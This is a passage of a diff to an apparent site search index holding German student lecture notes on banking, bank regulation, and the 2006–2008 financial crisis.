+            "text": "Kreditvergabe (Zinsdifferenzgesch\u00e4ft)  Verluste nur, wenn Kredite nicht mehr zur\u00fcck gezahlt werden k\u00f6nnen    Kommissionsgesch\u00e4ft: z.B. Verm\u00f6gensverwaltung (niedriges Risiko)  Eigenhandel: Hohes Risiko  Mit Einlagen, noch h\u00f6heres Risiko mit reinem Fremdkapital    Risiken:  Solvenzrisiko durch Kreditvergabe  Liquidit\u00e4tsrisiko (Haushalte wollen Geld zur\u00fcck, \"Bank Run\")", 
+            "title": "Bankgesch\u00e4ft"
+        }, 
+        {
+            "location": "/Vwl/11_Banken/#bankenregulierung", 
+            "text": "Mikroprudentielle Regulierung: Stabilit\u00e4t einzelner Banken  Makgroprudentielle Regulierung: Stabilit\u00e4t des ganzen Bankensystems (z.B. SNB)  Banken sollen ein bestimmtes Eigenkapital und Liquidit\u00e4t haben  Vorschriften zur Konkursabwicklung  Momentan ist mit der Regulierung \"Basel II\" 8% Eigenkapital nach Risiko gewichtet gefordert  Bis 2019 soll dieser bis 13% erh\u00f6ht werden  Um EK zu erh\u00f6hen, kann Bank weniger Kredite herausgeben oder z.B. Aktien verkaufen  Obligatorische Einlageversicherung : Der Kunde kann garantiert seinen Betrag bis zu einer Obergrenze liquidieren  Soll Bank-Run verhindern    Um Liquidit\u00e4tsvorgaben einzuhalten, haben sich bis 2008 Banken gegenseitig Liquide Mittel ausgeliehen (Interbank-Gesch\u00e4ft)  Gef\u00e4hrlich, bei einem Bank-Run w\u00fcrde Bank A von Bank B Liquidit\u00e4t ausleihen, womit nun Bank B ein Problem hat, usw...  Dies ist 2008 auch passiert  Seit 2008 sind Banken abh\u00e4ngig von Zentralbanken f\u00fcr Liquidit\u00e4t    \"Too big to fail\": Banken d\u00fcrfen nicht konkurs gehen, weil sie sonst grosse Teile der Wirtschaft mit in den Abgrund reissen w\u00fcrden  L\u00f6sungsans\u00e4tze: Verhinderhung der Insolvenz mit h\u00f6heren Eigenkapitalforderungen  \"Living Will\": Organisationsform, welche Erlaubt, einzelne noch funktionsf\u00e4hige Gesch\u00e4ftsbereiche rasch abzuspalten (siehe UBS, CS)", 
+            "title": "Bankenregulierung"
+        }, 
+        {
+            "location": "/Vwl/12_Finanzkrise/", 
+            "text": "Die grosse Finanzkrise\n\n\nImobilienkrise USA 2006\n\n\n\n\n2001: Rezession in der USA (nach Platzen dotCom-Blase)\n\n\nUSA hat Geldmenge erh\u00f6ht, tiefe Zinsen\n\n\nNachfrage nach Hypotheken gingen hinauf\n\n\n\n\n\n\nUnabh\u00e4ngig davon: Neues Finanzinstrument ABS (Asset-backed Securities)\n\n\nHypotheken b\u00fcndeln und als Wertpapier an Investoren verkaufen\n\n\nSichere Wertpapiere, die durch Immobilien gesichert sind\n\n\nInvestoren z.B. Liemann Brothers\n\n\n\n\n\n\nNachfrage an ABS steigt, Banken geben mehr Hypotheken raus\n\n\nHypotheken wurden als Gewinn f\u00fcr Kunden ausgegeben, weil H\u00e4userpreise immer gestiegen sind und Wertsteigerung h\u00f6her war als Zinsen\n\n\nFunktioniert bis 2006, da stiegen H\u00e4userpreise nicht mehr\n\n\nLeute konnten sich die Zinsen nicht leisten, flogen raus\n\n\n\n\n\n\n2004 hat die Zentralbrank die Geldmenge wieder zur\u00fcck genommen, Zinsen gingen wieder rauf\n\n\nDadurch weniger Nachfrage, grosses Angebot an Immobilien -\n  Druck auf Preise\n\n\nDadurch zur\u00fcckgehende Nachfrage, ABS-Preise sanken ins bodenlose ab\n\n\nDas hat dem Vertrauen der Banken geschadet, dadurch ist auch Interbankengesch\u00e4ft zusammen gebrochen\n\n\nDurch die \"Panikverk\u00e4ufe\" von ABS, um Liquidit\u00e4t zu erhalten, lassen die ABS-Preise weiter fallen. Dadurch sanken ABS-Preise weiter, noch gr\u00f6ssere Verluste, usw...\n\n\nDie Zentralbanken mussten eingreifen\n\n\nBanken haben zuvor noch Kredite aufgenommen, um ABS zu kaufen\n\n\nWenn Wertverlust ABS gr\u00f6sser als das Eigenkapital ist, geht Bank konkurs\n\n\nDa Banken nicht voneinander wissen, wieviel ABS die anderen haben, gaben sie keine Kredite mehr\n\n\n\n\nBankenkrise 2008\n\n\nEurokrise seit 2010", 
+            "title": "12 Finanzkrise"
+        }, 
+        {
+            "location": "/Vwl/12_Finanzkrise/#die-grosse-finanzkrise", 
+            "text": "", 
+            "title": "Die grosse Finanzkrise"
+        }, 
+        {
+            "location": "/Vwl/12_Finanzkrise/#imobilienkrise-usa-2006", 
+            "text": "2001: Rezession in der USA (nach Platzen dotCom-Blase)  USA hat Geldmenge erh\u00f6ht, tiefe Zinsen  Nachfrage nach Hypotheken gingen hinauf    Unabh\u00e4ngig davon: Neues Finanzinstrument ABS (Asset-backed Securities)  Hypotheken b\u00fcndeln und als Wertpapier an Investoren verkaufen  Sichere Wertpapiere, die durch Immobilien gesichert sind  Investoren z.B. Liemann Brothers    Nachfrage an ABS steigt, Banken geben mehr Hypotheken raus  Hypotheken wurden als Gewinn f\u00fcr Kunden ausgegeben, weil H\u00e4userpreise immer gestiegen sind und Wertsteigerung h\u00f6her war als Zinsen  Funktioniert bis 2006, da stiegen H\u00e4userpreise nicht mehr  Leute konnten sich die Zinsen nicht leisten, flogen raus    2004 hat die Zentralbrank die Geldmenge wieder zur\u00fcck genommen, Zinsen gingen wieder rauf  Dadurch weniger Nachfrage, grosses Angebot an Immobilien -   Druck auf Preise  Dadurch zur\u00fcckgehende Nachfrage, ABS-Preise sanken ins bodenlose ab  Das hat dem Vertrauen der Banken geschadet, dadurch ist auch Interbankengesch\u00e4ft zusammen gebrochen  Durch die \"Panikverk\u00e4ufe\" von ABS, um Liquidit\u00e4t zu erhalten, lassen die ABS-Preise weiter fallen. Dadurch sanken ABS-Preise weiter, noch gr\u00f6ssere Verluste, usw...  Die Zentralbanken mussten eingreifen  Banken haben zuvor noch Kredite aufgenommen, um ABS zu kaufen  Wenn Wertverlust ABS gr\u00f6sser als das Eigenkapital ist, geht Bank konkurs  Da Banken nicht voneinander wissen, wieviel ABS die anderen haben, gaben sie keine Kredite mehr", 
+            "title": "Imobilienkrise USA 2006"
+        }, 
+        {
+            "location": "/Vwl/12_Finanzkrise/#bankenkrise-2008", 
+            "text": "", 
+            "title": "Bankenkrise 2008"
+        }, 
+        {
+            "location": "/Vwl/12_Finanzkrise/#eurokrise-seit-2010", 
+            "text": "", 
+            "title": "Eurokrise seit 2010"
         }, 
         {
             "location": "/Vwl/1_Exam/", 
